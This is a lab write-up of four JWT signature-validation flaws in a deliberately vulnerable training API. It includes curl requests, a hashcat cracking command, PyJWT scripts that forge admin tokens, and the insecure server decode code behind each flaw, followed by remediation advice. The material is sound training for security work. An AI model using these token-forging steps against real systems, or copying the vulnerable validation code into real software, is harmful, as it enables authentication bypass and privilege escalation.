# JWT Signature Validation Vulnerabilities Assessment

## Overview

This project focused on identifying and exploiting common JSON Web Token (JWT) signature validation vulnerabilities within a controlled API environment. The assessment explored several JWT implementation weaknesses that can lead to authentication bypass, privilege escalation, and unauthorized access to protected resources.

The engagement demonstrated how improper JWT validation logic, weak cryptographic secrets, and algorithm confusion vulnerabilities can be abused to forge valid authentication tokens and escalate privileges to administrative access.

---

## Objectives

The objectives of this assessment were to:

* Analyze JWT-based authentication mechanisms.
* Identify weaknesses in JWT signature validation implementations.
* Demonstrate privilege escalation through JWT manipulation.
* Assess the security impact of misconfigured authentication systems.
* Document mitigation strategies and secure implementation practices.

---

## Scope

The assessment covered multiple API authentication scenarios involving:

* Missing JWT signature validation.
* JWT algorithm downgrade attacks.
* Weak symmetric signing secrets.
* JWT signature algorithm confusion vulnerabilities.

---

## Methodology

The assessment followed a structured approach:

1. Authenticate to target API endpoints.
2. Capture and decode issued JWT tokens.
3. Analyze JWT headers, payloads, and signatures.
4. Identify signature validation weaknesses.
5. Manipulate JWT claims and algorithms.
6. Generate forged authentication tokens.
7. Validate privilege escalation.
8. Document security findings and remediation recommendations.

---

# Finding 1: Missing JWT Signature Validation

## Description

The API failed to verify the integrity of JWT signatures before processing authentication claims. This allowed modification of JWT payload data without requiring a valid signature.

## Attack Process

### Step 1: Obtain JWT Token

```bash
curl -H 'Content-Type: application/json' \
-X POST \
-d '{"username":"user","password":"password2"}' \
http://TARGET/api/v1.0/example2
```

### Step 2: Verify Normal Access

```bash
curl -H 'Authorization: Bearer <JWT>' \
http://TARGET/api/v1.0/example2?username=user
```

The application correctly identified the user as a non-administrative account.

### Step 3: Remove Signature Validation

The JWT signature portion was removed while retaining the header and payload.

```
HEADER.PAYLOAD.
```

The server continued accepting the token despite the missing signature.

### Step 4: Modify Privilege Claims

The JWT payload was decoded and the administrative claim modified:

```json
{
  "username": "user",
  "admin": 1
}
```

The modified token successfully granted administrative privileges.

---

## Root Cause

The application disabled JWT signature verification:

```python
payload = jwt.decode(
    token,
    options={'verify_signature': False}
)
```

---

## Security Impact

* Authentication bypass
* Privilege escalation
* Account impersonation
* Complete compromise of authorization controls

---

# Finding 2: JWT Algorithm Downgrade (None Algorithm)

## Description

The application trusted the JWT header's `alg` value without restricting accepted algorithms, allowing downgrade to the `None` algorithm.

## Attack Process

### Step 1: Obtain JWT Token

```bash
curl -H 'Content-Type: application/json' \
-X POST \
-d '{"username":"user","password":"password3"}' \
http://TARGET/api/v1.0/example3
```

### Step 2: Modify JWT Header

The JWT header was altered from:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

to:

```json
{
  "typ": "JWT",
  "alg": "None"
}
```

### Step 3: Modify Privilege Claims

The payload was updated:

```json
{
  "username": "user",
  "admin": 1
}
```

### Step 4: Submit Forged Token

The server accepted the modified JWT despite an invalid signature, resulting in successful administrative access.

---

## Root Cause

The application dynamically trusted the algorithm supplied by the client:

```python
header = jwt.get_unverified_header(token)

signature_algorithm = header['alg']

payload = jwt.decode(
    token,
    self.secret,
    algorithms=signature_algorithm
)
```

---

## Security Impact

* Complete authentication bypass
* Administrative privilege escalation
* JWT forgery
* Unauthorized access to protected resources

---

# Finding 3: Weak JWT Symmetric Secret

## Description

The API used a weak HS256 signing secret, enabling offline secret recovery through dictionary attacks.

## Attack Process

### Step 1: Obtain JWT Token

```bash
curl -H 'Content-Type: application/json' \
-X POST \
-d '{"username":"user","password":"password4"}' \
http://TARGET/api/v1.0/example4
```

### Step 2: Save Token

```bash
echo "<JWT>" > jwt.txt
```

### Step 3: Perform Secret Cracking

```bash
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```

The JWT signing secret was successfully recovered.

### Step 4: Forge Administrative Token

Using PyJWT:

```python
import jwt

secret = "RECOVERED_SECRET"

payload = {
    "username": "admin",
    "admin": 1
}

token = jwt.encode(
    payload,
    secret,
    algorithm="HS256"
)

print(token)
```

### Step 5: Validate Privilege Escalation

The forged token successfully granted administrative access.

---

## Root Cause

The application relied on a weak and predictable symmetric signing secret.

---

## Security Impact

* Offline credential recovery
* JWT forgery
* Privilege escalation
* Authentication compromise

---

# Finding 4: JWT Signature Algorithm Confusion

## Description

The API accepted both symmetric and asymmetric signing algorithms simultaneously, allowing attackers to misuse a public RSA key as an HMAC secret.

## Attack Process

### Step 1: Obtain Public Key and JWT

```bash
curl -H 'Content-Type: application/json' \
-X POST \
-d '{"username":"user","password":"password5"}' \
http://TARGET/api/v1.0/example5
```

The API returned:

* Public RSA key
* RS256-signed JWT

### Step 2: Downgrade Algorithm

The JWT signing algorithm was modified from:

```json
"alg": "RS256"
```

to:

```json
"alg": "HS256"
```

### Step 3: Generate Forged Token

Using the exposed public key as the HMAC secret:

```python
import jwt

public_key = "PUBLIC_KEY"

payload = {
    "username": "user",
    "admin": 1
}

token = jwt.encode(
    payload,
    public_key,
    algorithm="HS256"
)

print(token)
```

### Step 4: Validate Administrative Access

The forged token was accepted by the server, resulting in successful privilege escalation.

---

## Root Cause

The application permitted both symmetric and asymmetric algorithms within the same verification function:

```python
payload = jwt.decode(
    token,
    self.secret,
    algorithms=[
        "HS256",
        "HS384",
        "HS512",
        "RS256",
        "RS384",
        "RS512"
    ]
)
```

---

## Security Impact

* Authentication bypass
* Token forgery
* Administrative access compromise
* Complete trust boundary failure

---

## Remediation

The following security controls were recommended:

* Always validate JWT signatures.
* Explicitly whitelist approved signing algorithms.
* Disable support for the `None` algorithm.
* Use strong cryptographically secure secrets.
* Avoid mixing symmetric and asymmetric algorithms.
* Separate verification logic for HS and RS algorithms.
* Rotate signing keys periodically.
* Implement certificate-based authentication for service-to-service communication.
* Enforce secure JWT validation libraries and configurations.

---

## Tools Used

* Linux
* cURL
* CyberChef
* Hashcat
* Python
* PyJWT
* JWT.io

---

## Key Takeaways

This assessment demonstrated that improper JWT implementation can completely undermine authentication and authorization controls. Small implementation mistakes such as disabling signature verification, trusting user-supplied algorithms, using weak secrets, or mixing cryptographic schemes can allow attackers to forge authentication tokens and obtain privileged access.

The exercise reinforced the importance of secure JWT validation practices, strong cryptographic key management, and strict algorithm enforcement.

---

## Disclaimer

This project was conducted within an authorized laboratory and controlled training environment for educational and defensive cybersecurity purposes. All testing activities were performed against intentionally vulnerable systems with explicit authorization.
